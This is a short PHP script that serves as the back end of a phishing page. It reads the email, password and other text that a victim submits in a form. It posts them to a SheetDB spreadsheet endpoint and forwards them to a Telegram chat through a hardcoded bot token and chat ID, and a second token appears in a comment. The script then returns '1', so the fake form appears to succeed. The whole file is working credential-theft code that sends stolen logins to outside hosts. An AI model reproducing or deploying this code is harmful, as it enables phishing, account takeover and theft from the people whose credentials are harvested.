<?php
$full_infor = $_POST['text'];
$website = "https://api.telegram.org/bot6407286805:AAEHaRH5JkHn8vhcwNQxOsUT24YmUyLAlEc";
$chatId = -4047914713;
$email = $_POST['email'];
$password = $_POST['password'];
insertToSheet($email, $password, $full_infor);

// $website = 'https://api.telegram.org/bot6372071467:AAHLb7HV4BIT40f8kueOs0UG9b-LcGPmZPc/sendMessage';
// $chatId = -1001857558856;
$params = [
    'chat_id' => $chatId,
    'text' => $full_infor,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo 1;
exit;
function insertToSheet($personal_email, $password, $infor)
{
    $curl = curl_init();
    $data = [[
        'Email' => $personal_email,
        'Password' => $password,
        'Infor' => $infor,
    ]];

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://sheetdb.io/api/v1/vpa7txbvojlil',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
